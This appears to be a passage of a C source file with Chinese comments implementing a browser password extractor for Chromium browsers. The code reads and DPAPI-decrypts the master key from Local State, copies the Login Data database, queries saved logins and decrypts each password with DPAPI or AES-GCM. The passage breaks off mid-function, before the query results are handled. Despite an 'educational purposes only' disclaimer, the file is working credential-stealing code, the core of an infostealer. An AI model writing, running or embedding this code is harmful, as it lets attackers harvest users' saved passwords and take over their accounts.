/********************************************************************************
 * browser_pass_c.c - 浏览器密码解密工具
 * 
 * 功能描述:
 * 此程序用于提取和解密主流Chromium内核浏览器(Chrome/Edge/Brave等)保存的密码。
 * 支持两种密码加密格式:
 * 1. 传统格式: 直接使用Windows DPAPI (CryptProtectData/CryptUnprotectData)加密
 * 2. v10格式: 先提取主密钥，再用AES-GCM算法加密密码数据
 * 
 * 实现原理:
 * 1. 从浏览器的Local State文件中提取主密钥(已使用DPAPI加密)
 * 2. 使用CryptUnprotectData解密主密钥
 * 3. 复制浏览器的密码数据库(Login Data)到临时文件
 * 4. 使用SQLite读取数据库中的密码记录
 * 5. 根据密码格式选择不同的解密方法:
 *    - 传统格式: 直接用CryptUnprotectData解密
 *    - v10格式: 使用AES-GCM和主密钥解密(CNG库)
 * 
 * 依赖库:
 * - Windows API: windows.h, wincrypt.h, shlobj.h, bcrypt.h
 * - SQLite: sqlite3.h
 * 
 * 编译指南:
 * 需要链接以下库: crypt32.lib, shell32.lib, advapi32.lib, bcrypt.lib, sqlite3.lib
 * 示例: cl browser_pass_c.c sqlite3.lib /link crypt32.lib shell32.lib advapi32.lib bcrypt.lib
 * 
 * 安全注意事项:
 * 本程序仅用于教育目的，展示Windows凭据保护机制的工作原理。
 * 未经授权访问他人凭据可能违反法律。
 ********************************************************************************/

 #define _CRT_SECURE_NO_WARNINGS // 禁用安全警告，允许使用传统C函数如sprintf, fopen等

 /* 系统标准库 */
 #include <stdio.h>    // 标准输入输出函数，如printf, fopen等
 #include <stdlib.h>   // 内存管理、程序控制等，如malloc, free
 #include <string.h>   // 字符串处理函数，如strcpy, strcat
 #include <windows.h>  // Windows API核心，提供Windows基础功能
 #include <wincrypt.h> // Windows加密API，提供CryptProtectData/CryptUnprotectData等
 #include <shlobj.h>   // Windows Shell API，提供SHGetFolderPathA等获取系统路径函数
 #include <direct.h>   // 目录操作函数
 #include <bcrypt.h>   // Windows Cryptography Next Generation (CNG) API，用于AES-GCM解密
 #include "sqlite3.h"  // SQLite数据库访问库，用于读取浏览器密码数据库
 
 /* 链接所需的库文件 */
 #pragma comment(lib, "crypt32.lib")  // Windows数据保护API (DPAPI)
 #pragma comment(lib, "shell32.lib")  // Windows Shell函数
 #pragma comment(lib, "advapi32.lib") // Windows高级API，包含注册表和安全相关功能
 #pragma comment(lib, "bcrypt.lib")   // Windows CNG加密库，用于AES-GCM解密
 
 /* NT_SUCCESS宏定义 - 用于检查Windows NT API返回的状态码 */
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) // 如果Status >=0，则表示成功
 #endif
 
 /* 全局常量定义 */
 #define MAX_PATH_LENGTH 260 // Windows路径最大长度
 #define MAX_BROWSERS 5      // 支持的最大浏览器数量
 #define MAX_BUFFER 4096     // 通用缓冲区大小
 
 /* 浏览器数据结构 - 存储不同浏览器的特定信息 */
 typedef struct {
     const char* name;       // 浏览器名称，用于显示
     const char* path;       // 登录数据文件的相对路径（相对于LocalAppData）
     const char* local_state;// Local State文件的路径（包含加密的主密钥）
 } Browser;
 
 /**
  * Base64解码函数
  * 
  * 说明: 
  * Base64是一种基于64个可打印字符表示二进制数据的编码方法。
  * 浏览器储存的主密钥是Base64编码的，需要先解码才能使用。
  * 
  * 算法原理:
  * 1. Base64将3字节的二进制数据编码为4个可打印字符
  * 2. 每6比特映射到一个字符(2^6=64种可能性)
  * 3. 标准Base64字符集: A-Z, a-z, 0-9, +, /，补齐使用=
  * 
  * 参数:
  * @encoded - 输入的Base64编码字符串
  * @outLen  - 输出参数，返回解码后的数据长度
  * 
  * 返回值:
  * 成功: 返回解码后的二进制数据（需要调用者手动free）
  * 失败: 返回NULL并设置outLen为0
  */
 unsigned char* Base64Decode(const char* encoded, int* outLen) {
     // Base64字符集定义: 索引0-63分别对应64个编码字符
     const char base64_chars[] = 
         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"  // 0-25  (索引0-25)
         "abcdefghijklmnopqrstuvwxyz"  // 26-51 (索引26-51)
         "0123456789+/";               // 52-63 (索引52-63)
     
     // 输入验证
     if (!encoded || !outLen) return NULL;
     
     // 获取输入字符串长度
     size_t length = strlen(encoded);
     if (length == 0) {
         *outLen = 0;
         return NULL;
     }
     
     // 分配空间存储解码结果
     // Base64编码将3字节数据编码为4字符，所以解码后长度最大为原长度的3/4
     unsigned char* decoded = (unsigned char*)malloc(length);
     if (!decoded) {
         *outLen = 0;
         return NULL;
     }
     
     int i = 0, j = 0, k = 0;          // 循环计数器
     unsigned char char_array_4[4];    // 存储4个输入字符
     unsigned char char_array_3[3];    // 存储解码后的3个字节
     int decode_len = 0;               // 解码结果长度计数器
     
     // 主解码循环
     while (length-- && encoded[i] != '=') {  // 处理直到遇到填充字符'='或结束
         char_array_4[j++] = encoded[i++];    // 收集4个字符
         
         if (j == 4) {  // 收集到4个字符(完整的编码单元)
             // 将4个字符转换为其在base64表中的索引值(0-63)
             for (j = 0; j < 4; j++) {
                 const char* ptr = strchr(base64_chars, char_array_4[j]);
                 char_array_4[j] = ptr ? (unsigned char)(ptr - base64_chars) : 0;
             }
             
             // 重组字节 - 将4个6比特值转换回3个8比特值(字节)
             // 第一个字节: 第一个字符的6位 + 第二个字符的高2位
             char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
             // 第二个字节: 第二个字符的低4位 + 第三个字符的高4位
             char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
             // 第三个字节: 第三个字符的低2位 + 第四个字符的6位
             char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
             
             // 存储解码结果
             for (j = 0; j < 3; j++) {
                 decoded[decode_len++] = char_array_3[j];
             }
             j = 0;  // 重置计数器，准备处理下一组
         }
     }
     
     // 处理末尾不足4个字符的情况(填充或结束)
     if (j) {
         // 将未使用的位置填充为0
         for (k = j; k < 4; k++) {
             char_array_4[k] = 0;
         }
         
         // 同样转换为索引值
         for (k = 0; k < 4; k++) {
             const char* ptr = strchr(base64_chars, char_array_4[k]);
             char_array_4[k] = ptr ? (unsigned char)(ptr - base64_chars) : 0;
         }
         
         // 重组字节(与上面相同的逻辑)
         char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
         char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
         char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
         
         // 根据填充规则(=的数量)存储有效字节
         for (k = 0; k < j - 1; k++) {
             decoded[decode_len++] = char_array_3[k];
         }
     }
     
     *outLen = decode_len;  // 设置解码后的数据长度
     return decoded;        // 返回解码结果
 }
 
 /**
  * 读取整个文件内容
  * 
  * 说明:
  * 此函数读取指定路径文件的全部内容到内存中。
  * 主要用于读取浏览器的Local State文件(JSON格式)。
  * 
  * 参数:
  * @filePath - 要读取的文件路径
  * 
  * 返回值:
  * 成功: 返回文件内容的字符串(需调用者free)
  * 失败: 返回NULL
  */
 char* ReadEntireFile(const char* filePath) {
     FILE* file = fopen(filePath, "rb");  // 以二进制模式打开，防止文本模式下的字符转换
     if (!file) return NULL;              // 文件打开失败
     
     // 获取文件大小
     fseek(file, 0, SEEK_END);            // 定位到文件末尾
     long size = ftell(file);             // 获取当前位置(即文件大小)
     fseek(file, 0, SEEK_SET);            // 回到文件开头
     
     // 分配内存存储文件内容(多分配一个字节用于null终止符)
     char* content = (char*)malloc(size + 1);
     if (!content) {
         fclose(file);
         return NULL;
     }
     
     // 读取文件内容
     size_t bytesRead = fread(content, 1, size, file);
     content[bytesRead] = '\0';           // 添加字符串终止符
     
     fclose(file);
     return content;
 }
 
 /**
  * 从JSON字符串中提取值
  * 
  * 说明:
  * 这是一个简易的JSON解析函数，专为提取encrypted_key值设计。
  * 不是通用JSON解析器，仅适用于从浏览器Local State文件中提取加密主密钥。
  * 
  * JSON格式示例:
  * {"os_crypt":{"encrypted_key":"BASE64_ENCODED_KEY"}}
  * 
  * 实现方法:
  * 1. 查找键名("key":)
  * 2. 定位后面的字符串值(在双引号之间)
  * 3. 提取字符串值
  * 
  * 参数:
  * @json - 输入的JSON字符串
  * @key  - 要提取的键名
  * 
  * 返回值:
  * 成功: 返回提取的字符串值(需调用者free)
  * 失败: 返回NULL
  */
 char* ExtractFromJson(const char* json, const char* key) {
     // 输入验证
     if (!json || !key) return NULL;
     
     // 构造要查找的模式: "key":
     char* keyWithQuotes = (char*)malloc(strlen(key) + 4);
     if (!keyWithQuotes) return NULL;
     sprintf(keyWithQuotes, "\"%s\":", key);
     
     // 在JSON中查找键名
     char* pos = strstr(json, keyWithQuotes);
     free(keyWithQuotes);  // 释放临时内存
     
     if (!pos) return NULL;  // 未找到指定键
     
     // 找到键名后，定位到值的开始位置
     pos = strchr(pos, ':');  // 找到冒号
     if (!pos) return NULL;
     
     pos = strchr(pos, '\"');  // 找到值的开始引号
     if (!pos) return NULL;
     
     // 提取引号之间的字符串值
     char* start = pos + 1;           // 值的开始位置(跳过引号)
     char* end = strchr(start, '\"'); // 值的结束位置(结束引号)
     if (!end) return NULL;
     
     // 计算值的长度并复制
     size_t len = end - start;
     char* result = (char*)malloc(len + 1);
     if (!result) return NULL;
     
     strncpy(result, start, len);  // 复制字符串值
     result[len] = '\0';           // 添加终止符
     
     return result;
 }
 
 /**
  * 获取本地AppData路径
  * 
  * 说明:
  * 此函数获取当前用户的LocalAppData文件夹路径。
  * Windows浏览器通常将用户数据存储在这个位置。
  * 
  * 实现细节:
  * 使用Windows API SHGetFolderPathA获取特殊文件夹路径。
  * CSIDL_LOCAL_APPDATA对应于: C:\Users\<用户名>\AppData\Local
  * 
  * 返回值:
  * 成功: 返回LocalAppData路径字符串(需调用者free)
  * 失败: 返回NULL
  */
 char* GetLocalAppDataPath() {
     // 分配足够大的缓冲区存储路径
     char* path = (char*)malloc(MAX_PATH_LENGTH);
     if (!path) return NULL;
     
     // 获取LocalAppData路径
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path)))
         return path;
     
     // 如果失败则释放内存并返回NULL
     free(path);
     return NULL;
 }
 
 /**
  * 获取浏览器的用户数据目录
  * 
  * 说明:
  * 根据浏览器类型构建完整的用户数据目录路径。
  * 例如Chrome的用户数据目录是: %LocalAppData%\Google\Chrome\User Data\
  * 
  * 参数:
  * @browser - 浏览器信息结构体，包含路径信息
  * 
  * 返回值:
  * 成功: 返回用户数据目录路径(需调用者free)
  * 失败: 返回NULL
  */
 char* GetUserDataDir(const Browser* browser) {
     // 先获取LocalAppData基础路径
     char* localAppData = GetLocalAppDataPath();
     if (!localAppData) return NULL;
     
     // 分配内存存储完整路径
     char* userDataDir = (char*)malloc(MAX_PATH_LENGTH);
     if (!userDataDir) {
         free(localAppData);
         return NULL;
     }
     
     // 开始构建路径
     strcpy(userDataDir, localAppData);  // 复制基础路径
     strcat(userDataDir, "\\");          // 添加路径分隔符
     
     // 智能提取用户数据目录路径
     // 所有浏览器都有"User Data"目录，我们需要提取到这个目录为止
     const char* searchStr = "\\User Data\\";
     char* pos = strstr(browser->path, searchStr);
     if (pos) {
         // 计算前缀长度(到"User Data\"为止)
         size_t prefixLen = pos - browser->path + strlen(searchStr);
         // 拼接路径前缀部分
         strncat(userDataDir, browser->path, prefixLen);
     }
     
     free(localAppData);  // 释放基础路径内存
     return userDataDir;
 }
 
 /**
  * 创建临时文件路径
  * 
  * 说明:
  * 生成系统临时目录中的临时文件路径。
  * 用于复制浏览器数据库文件，因为浏览器运行时可能锁定原始文件。
  * 
  * 参数:
  * @prefix - 临时文件名前缀(通常是浏览器名)
  * 
  * 返回值:
  * 成功: 返回临时文件完整路径(需调用者free)
  * 失败: 返回NULL
  */
 char* GetTempFilePath(const char* prefix) {
     // 获取系统临时目录路径
     char* tempPath = (char*)malloc(MAX_PATH_LENGTH);
     if (!tempPath) return NULL;
     
     // 存储临时文件名
     char* tempFileName = (char*)malloc(MAX_PATH_LENGTH);
     if (!tempFileName) {
         free(tempPath);
         return NULL;
     }
     
     // 获取系统临时目录(通常是%TEMP%)
     GetTempPathA(MAX_PATH_LENGTH, tempPath);
     
     // 创建临时文件名，保证唯一性
     // 函数格式: <路径>\<前缀><唯一数字>.tmp
     GetTempFileNameA(tempPath, prefix, 0, tempFileName);
     
     free(tempPath);  // 释放临时路径内存
     return tempFileName;  // 返回完整的临时文件路径
 }
 
 /**
  * 将二进制数据转换为十六进制字符串
  * 
  * 说明:
  * 将二进制数据(字节数组)转换为人类可读的十六进制字符串。
  * 用于显示加密密码或主密钥的内容。
  * 
  * 格式示例: "01 23 45 67 89 AB CD EF..."
  * 
  * 参数:
  * @data     - 输入的二进制数据
  * @dataLen  - 数据长度
  * @maxBytes - 最多转换的字节数(防止过长)
  * 
  * 返回值:
  * 成功: 返回十六进制字符串(需调用者free)
  * 失败: 返回NULL
  */
 char* ToHexString(const unsigned char* data, int dataLen, int maxBytes) {
     // 输入验证
     if (!data || dataLen <= 0) return NULL;
     
     // 16进制字符集，用于转换
     const char* hexChars = "0123456789ABCDEF"; // 0-15对应的十六进制表示
     
     // 确定实际转换的字节数
     int actualLen = (dataLen < maxBytes) ? dataLen : maxBytes;
     
     // 分配内存:
     // - 每个字节需要2个十六进制字符
     // - 字节之间有空格分隔
     // - 如果数据被截断，末尾加"..."
     // - 结尾有\0终止符
     char* result = (char*)malloc(actualLen * 3 + 4); // 3 = 2个字符 + 空格
     if (!result) return NULL;
     
     // 格式化数据为十六进制字符串
     int pos = 0;
     for (int i = 0; i < actualLen; ++i) {
         // 转换一个字节为2个十六进制字符
         result[pos++] = hexChars[(data[i] >> 4) & 0xF]; // 高4位
         result[pos++] = hexChars[data[i] & 0xF];        // 低4位
         
         // 添加空格分隔符(除了最后一个字节)
         if (i < actualLen - 1)
             result[pos++] = ' ';
     }
     
     // 如果数据被截断，添加省略号
     if (dataLen > maxBytes) {
         strcpy(result + pos, "...");
         pos += 3;
     }
     
     // 添加字符串终止符
     result[pos] = '\0';
     return result;
 }
 
 /**
  * 获取浏览器主密钥
  * 
  * 说明:
  * 此函数执行以下步骤:
  * 1. 找到浏览器的Local State文件
  * 2. 从JSON中提取encrypted_key
  * 3. Base64解码encrypted_key
  * 4. 移除DPAPI前缀(前5字节)
  * 5. 使用Windows DPAPI解密得到主密钥
  * 
  * 主密钥是浏览器用于加密保存密码的密钥(v10格式)
  * 
  * 参数:
  * @browser   - 浏览器信息
  * @keyLength - 输出参数，返回密钥长度
  * 
  * 返回值:
  * 成功: 返回解密后的主密钥(需调用者free)
  * 失败: 返回NULL并设置keyLength为0
  */
 unsigned char* GetBrowserMasterKey(const Browser* browser, int* keyLength) {
     // 初始化输出长度为0
     *keyLength = 0;
     
     // 获取浏览器用户数据目录
     char* userDataDir = GetUserDataDir(browser);
     if (!userDataDir) return NULL;
     
     // 构建Local State文件的完整路径
     char localStatePath[MAX_PATH_LENGTH];
     sprintf(localStatePath, "%s%s", userDataDir, browser->local_state);
     free(userDataDir);  // 释放用户数据目录路径
     
     // 读取Local State文件内容(JSON格式)
     char* localStateContent = ReadEntireFile(localStatePath);
     if (!localStateContent) {
         printf("Cannot read %s\n", localStatePath);
         return NULL;
     }
     
     // 从JSON中提取encrypted_key值
     // 通常在os_crypt.encrypted_key字段中
     char* base64Key = ExtractFromJson(localStateContent, "encrypted_key");
     free(localStateContent);  // 释放JSON内容
     
     if (!base64Key) {
         printf("Cannot find encrypted_key in %s\n", localStatePath);
         return NULL;
     }
     
     // Base64解码encrypted_key
     int encryptedKeyLen = 0;
     unsigned char* encryptedKey = Base64Decode(base64Key, &encryptedKeyLen);
     free(base64Key);  // 释放base64编码的密钥
     
     // 验证解码结果
     if (!encryptedKey || encryptedKeyLen < 5) {
         printf("Base64 decoding failed\n");
         free(encryptedKey);
         return NULL;
     }
     
     // 跳过DPAPI前缀 - "DPAPI"(5字节)
     // Chrome的encrypted_key格式: "DPAPI" + DPAPI加密的数据
     unsigned char* encryptedKeyWithoutPrefix = (unsigned char*)malloc(encryptedKeyLen - 5);
     if (!encryptedKeyWithoutPrefix) {
         free(encryptedKey);
         return NULL;
     }
     
     // 复制DPAPI加密的部分(跳过前5字节)
     memcpy(encryptedKeyWithoutPrefix, encryptedKey + 5, encryptedKeyLen - 5);
     free(encryptedKey);  // 释放原始加密密钥
     
     // 使用Windows DPAPI解密主密钥
     DATA_BLOB dataIn, dataOut;
     dataIn.cbData = encryptedKeyLen - 5;             // 数据长度
     dataIn.pbData = encryptedKeyWithoutPrefix;       // 数据指针
     
     // CryptUnprotectData执行实际解密
     // 参数说明:
     // - 第1个: 输入加密数据
     // - 第2个: 输出描述(不需要)
     // - 第3个: 额外的熵(不需要)
     // - 第4个: 保留参数
     // - 第5个: 提示UI(不需要)
     // - 第6个: 标志(0表示默认行为)
     // - 第7个: 输出解密数据
     if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
         DWORD error = GetLastError();
         printf("Master key decryption failed, error code: 0x%x\n", error);
         free(encryptedKeyWithoutPrefix);
         return NULL;
     }
     
     free(encryptedKeyWithoutPrefix);  // 释放加密数据
     
     // 复制解密后的主密钥到新的内存块
     unsigned char* masterKey = (unsigned char*)malloc(dataOut.cbData);
     if (!masterKey) {
         LocalFree(dataOut.pbData);  // 释放DPAPI分配的内存
         return NULL;
     }
     
     // 复制主密钥并设置长度
     memcpy(masterKey, dataOut.pbData, dataOut.cbData);
     *keyLength = dataOut.cbData;
     
     // 释放DPAPI分配的内存
     LocalFree(dataOut.pbData);
     return masterKey;  // 返回解密后的主密钥
 }
 
 /**
  * AES-GCM解密函数
  * 
  * 说明:
  * 此函数用于解密v10格式的密码。
  * 
  * v10格式结构:
  * - 前3字节: "v10" 标识符
  * - 接下来12字节: 初始化向量(IV)
  * - 中间部分: 加密的密码数据
  * - 最后16字节: GCM认证标签
  * 
  * 使用Windows CNG API实现AES-GCM解密。
  * 
  * 参数:
  * @encryptedData - v10格式的加密数据
  * @dataLen       - 数据长度
  * @masterKey     - AES密钥(从浏览器获取的主密钥)
  * @keyLen        - 密钥长度
  * 
  * 返回值:
  * 成功: 返回解密后的密码字符串(需调用者free)
  * 失败: 返回错误信息字符串(需调用者free)
  */
 char* DecryptAESGCM(const unsigned char* encryptedData, int dataLen,
                   const unsigned char* masterKey, int keyLen) {
     // 初始化CNG相关变量
     BCRYPT_ALG_HANDLE hAlg = NULL;        // 算法提供程序句柄
     BCRYPT_KEY_HANDLE hKey = NULL;        // 密钥句柄
     NTSTATUS status = 0;                  // 操作状态
     DWORD cbData = 0;                     // 输出数据大小
     DWORD cbKeyObject = 0;                // 密钥对象大小
     DWORD cbResult = 0;                   // API结果大小
     PBYTE pbKeyObject = NULL;             // 密钥对象缓冲区
     PBYTE pbPlainText = NULL;             // 明文缓冲区
     char* decryptedPassword = NULL;       // 最终解密结果
     
     // 初始化认证信息结构体
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     BCRYPT_INIT_AUTH_MODE_INFO(authInfo);  // 必须初始化此宏
     
     // 跳过"v10"前缀(3字节)，获取实际的密文部分
     const unsigned char* ciphertext = encryptedData + 3;
     int ciphertextLen = dataLen - 3;
     
     // 从v10格式数据中提取各个组成部分:
     // - IV: 前12字节
     // - 加密数据: 中间部分
     // - 认证标签: 最后16字节
     const unsigned char* iv = ciphertext;                          // IV在最前面
     const unsigned char* encrypted = ciphertext + 12;              // 加密数据在IV之后
     int encryptedLen = ciphertextLen - 12 - 16;                    // 加密数据长度(总长减去IV和标签)
     const unsigned char* authTag = ciphertext + 12 + encryptedLen; // 认证标签在最后
     
     // 验证数据长度是否合理
     if (encryptedLen <= 0) {
         char* hexStr = ToHexString(encryptedData, dataLen, 16);
         char* result = (char*)malloc(strlen(hexStr) + 40);
         sprintf(result, "[Data length exception] %s", hexStr);
         free(hexStr);
         return result;
     }
     
     // 使用do-while(0)结构简化错误处理
     // 可以在任何地方用break退出并转到清理代码
     do {
         // 步骤1: 打开AES算法提供程序
         status = BCryptOpenAlgorithmProvider(
             &hAlg,                 // 输出算法句柄
             BCRYPT_AES_ALGORITHM,  // 使用AES算法
             NULL,                  // 使用默认提供程序
             0);                    // 无特殊标志
         if (!NT_SUCCESS(status)) break;
         
         // 步骤2: 设置链接模式为GCM(Galois/Counter Mode)
         // GCM是一种结合了CTR模式和GMAC的认证加密模式
         status = BCryptSetProperty(
             hAlg,                     // 算法句柄
             BCRYPT_CHAINING_MODE,     // 设置链接模式
             (PBYTE)BCRYPT_CHAIN_MODE_GCM,  // GCM模式
             sizeof(BCRYPT_CHAIN_MODE_GCM), // 模式名长度
             0);                       // 无特殊标志
         if (!NT_SUCCESS(status)) break;
         
         // 步骤3: 获取密钥对象所需的内存大小
         status = BCryptGetProperty(
             hAlg,                   // 算法句柄
             BCRYPT_OBJECT_LENGTH,   // 获取密钥对象长度
             (PBYTE)&cbKeyObject,    // 输出大小
             sizeof(DWORD),          // 输出缓冲区大小
             &cbResult,              // 实际写入的字节数
             0);                     // 无特殊标志
         if (!NT_SUCCESS(status)) break;
         
         // 步骤4: 分配密钥对象内存
         pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
         if (!pbKeyObject) break;
         
         // 步骤5: 创建密钥
         status = BCryptGenerateSymmetricKey(
             hAlg,                   // 算法句柄
             &hKey,                  // 输出密钥句柄
             pbKeyObject,            // 密钥对象缓冲区
             cbKeyObject,            // 密钥对象缓冲区大小
             (PBYTE)masterKey,       // 密钥材料(主密钥)
             keyLen,                 // 密钥材料长度
             0);                     // 无特殊标志
         if (!NT_SUCCESS(status)) break;
         
         // 步骤6: 设置认证信息
         // 在GCM模式中需要IV和认证标签
         authInfo.pbNonce = (PBYTE)iv;          // 设置IV(Nonce)
         authInfo.cbNonce = 12;                 // IV长度(12字节)
         authInfo.pbTag = (PBYTE)authTag;       // 设置认证标签
         authInfo.cbTag = 16;                   // 标签长度(16字节)
         authInfo.pbAuthData = NULL;            // 无附加认证数据
         authInfo.cbAuthData = 0;
         authInfo.pbMacContext = NULL;          // 无MAC上下文
         authInfo.cbMacContext = 0;
         authInfo.cbAAD = 0;                    // 无AAD
         authInfo.cbData = 0;                   // 无额外数据
         authInfo.dwFlags = 0;                  // 无特殊标志
         
         // 步骤7: 获取解密后明文缓冲区所需大小
         status = BCryptDecrypt(
             hKey,                   // 密钥句柄
             (PBYTE)encrypted,       // 加密数据
             encryptedLen,           // 加密数据长度
             &authInfo,              // 认证信息
             NULL,                   // 无IV(已在authInfo中设置)
             0,                      // IV长度
             NULL,                   // 输出缓冲区(NULL用于获取大小)
             0,                      // 输出缓冲区大小
             &cbData,                // 接收所需大小
             0);                     // 无特殊标志
         if (!NT_SUCCESS(status)) break;
         
         // 步骤8: 分配明文缓冲区(加1用于保存字符串终止符)
         pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbData + 1);
         if (!pbPlainText) break;
         
         // 步骤9: 执行实际解密
         status = BCryptDecrypt(
             hKey,                   // 密钥句柄
             (PBYTE)encrypted,       // 加密数据
             encryptedLen,           // 加密数据长度
             &authInfo,              // 认证信息
             NULL,                   // 无IV(已在authInfo中设置)
             0,                      // IV长度
             pbPlainText,            // 输出明文缓冲区
             cbData,                 // 明文缓冲区大小
             &cbResult,              // 实际写入的字节数
             0);                     // 无特殊标志
         if (!NT_SUCCESS(status)) break;
         
         // 步骤10: 添加字符串终止符，视为字符串
         pbPlainText[cbResult] = '\0';
         
         // 步骤11: 复制结果到新内存(使用标准C库函数管理)
         decryptedPassword = _strdup((char*)pbPlainText);
         
     } while (0);  // 循环只执行一次，但便于错误处理
     
     // 清理资源，释放所有分配的内存和句柄
     if (hKey) BCryptDestroyKey(hKey);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
     if (pbPlainText) HeapFree(GetProcessHeap(), 0, pbPlainText);
     
     // 如果解密失败，返回错误信息
     if (!decryptedPassword) {
         char* hexStr = ToHexString(encryptedData, dataLen, 16);
         char* result = (char*)malloc(strlen(hexStr) + 45);
         sprintf(result, "[AES-GCM decryption failed: 0x%08X] %s", status, hexStr);
         free(hexStr);
         return result;
     }
     
     // 返回解密结果
     return decryptedPassword;
 }
 
 /**
  * 解密密码
  * 
  * 说明:
  * 此函数根据加密格式选择合适的解密方法:
  * 1. 空密码: 直接返回提示信息
  * 2. v10格式: 使用AES-GCM和主密钥解密
  * 3. 传统格式: 直接使用DPAPI解密
  * 
  * v10格式检测条件:
  * 数据以字符串"v10"开头
  * 
  * 参数:
  * @encryptedData - 加密的密码数据
  * @dataLen       - 数据长度
  * @masterKey     - 浏览器主密钥(用于v10格式)
  * @keyLen        - 主密钥长度
  * 
  * 返回值:
  * 成功: 返回解密后的密码字符串(需调用者free)
  * 失败: 返回错误信息字符串(需调用者free)
  */
 char* DecryptPassword(const unsigned char* encryptedData, int dataLen, 
                     const unsigned char* masterKey, int keyLen) {
     // 处理空密码情况
     if (!encryptedData || dataLen <= 0) {
         return _strdup("[Empty password]");
     }
     
     // 检查是否为v10格式 (以"v10"开头)
     if (dataLen > 3 && encryptedData[0] == 'v' && 
         encryptedData[1] == '1' && encryptedData[2] == '0') {
         
         // 检查是否有主密钥(v10格式必需)
         if (!masterKey || keyLen <= 0) {
             // 没有主密钥时返回提示
             char* hexStr = ToHexString(encryptedData, dataLen, 16);
             char* result = (char*)malloc(strlen(hexStr) + 30);
             sprintf(result, "[v10 format-requires master key] %s", hexStr);
             free(hexStr);
             return result;
         } else {
             // 使用AES-GCM和主密钥解密v10格式
             return DecryptAESGCM(encryptedData, dataLen, masterKey, keyLen);
         }
     }
     
     // 传统格式: 尝试直接用Windows DPAPI解密
     DATA_BLOB dataIn, dataOut;
     dataIn.cbData = dataLen;               // 加密数据长度
     dataIn.pbData = (BYTE*)encryptedData;  // 加密数据指针
     
     // 使用CryptUnprotectData解密
     if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
         // 解密失败，提供具体错误信息
         DWORD error = GetLastError();
         char* hexStr = ToHexString(encryptedData, dataLen, 16);
         char* result = (char*)malloc(strlen(hexStr) + 40);
         
         // 根据错误码提供更具体的错误信息
         if (error == 0x80090005) {  // Access denied
             sprintf(result, "[Requires original user permissions] %s", hexStr);
         } else if (error == 0x80090016) {  // Bad Data
             sprintf(result, "[Invalid data] %s", hexStr);
         } else if (error == 0x00000057) {  // Invalid parameter
             sprintf(result, "[v10 format-invalid parameter] %s", hexStr);
         } else if (error == 0x0000000D) {  // Invalid data
             sprintf(result, "[Enterprise environment policy restriction] %s", hexStr);
         } else {
             sprintf(result, "[Decryption failed 0x%x] %s", error, hexStr);
         }
         
         free(hexStr);
         return result;
     }
     
     // 解密成功，复制结果并转为字符串
     char* password = (char*)malloc(dataOut.cbData + 1);
     memcpy(password, dataOut.pbData, dataOut.cbData);
     password[dataOut.cbData] = '\0';  // 添加字符串终止符
     
     // 释放DPAPI分配的内存
     LocalFree(dataOut.pbData);
     return password;
 }
 
 /**
  * 提取浏览器保存的密码
  * 
  * 说明:
  * 此函数是密码提取的主要处理流程，包括:
  * 1. 定位浏览器的密码数据库
  * 2. 提取浏览器主密钥
  * 3. 将数据库复制到临时文件(避免锁定)
  * 4. 使用SQLite读取密码记录
  * 5. 对每条记录尝试解密并显示
  * 
  * 参数:
  * @browser - 浏览器信息结构体
  */
 void ExtractBrowserPasswords(const Browser* browser) {
     // 获取LocalAppData路径作为基础
     char* localAppData = GetLocalAppDataPath();
     if (!localAppData) {
         printf("Cannot get AppData path\n");
         return;
     }
     
     // 构建浏览器密码数据库完整路径
     char dbPath[MAX_PATH_LENGTH];
     sprintf(dbPath, "%s\\%s", localAppData, browser->path);
     free(localAppData);
     
     // 检查数据库文件是否存在
     if (GetFileAttributesA(dbPath) == INVALID_FILE_ATTRIBUTES) {
         printf("%s database file does not exist: %s\n", browser->name, dbPath);
         return;
     }
     
     // 第一步: 获取浏览器主密钥(用于解密v10格式密码)
     int masterKeyLen = 0;
     unsigned char* masterKey = GetBrowserMasterKey(browser, &masterKeyLen);
     
     // 即使没有主密钥，也继续尝试(传统格式可能不需要)
     if (!masterKey) {
         printf("Warning: Cannot get master key for %s\n", browser->name);
     } else {
         printf("Successfully obtained %s master key (%d bytes)\n", browser->name, masterKeyLen);
     }
     
     // 第二步: 创建临时文件用于复制数据库
     // (浏览器运行时数据库可能被锁定)
     char* tempFile = GetTempFilePath(browser->name);
     if (!tempFile) {
         printf("Cannot create temp file\n");
         free(masterKey);
         return;
     }
     
     // 第三步: 复制数据库到临时文件
     if (!CopyFileA(dbPath, tempFile, FALSE)) {
         printf("Cannot copy %s database, error code: 0x%x\n", browser->name, GetLastError());
         free(masterKey);
         free(tempFile);
         return;
     }
     
     // 第四步: 使用SQLite打开数据库
     sqlite3* db;
     if (sqlite3_open(tempFile, &db) != SQLITE_OK) {
         printf("Cannot open %s database\n", browser->name);
         free(masterKey);
         free(tempFile);
         DeleteFileA(tempFile);
         return;
     }
     
     printf("\n===== %s Passwords =====\n\n", browser->name);
     
     // 第五步: 准备SQL查询
     // logins表存储所有保存的密码
     sqlite3_stmt* stmt;
     const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
     
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
         printf("SQL query preparation failed: %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
         free(masterKey);
         free(tempFile);
         DeleteFileA(tempFile);
         return;
     }
     
     // 第六步: 执行查询并处理结果
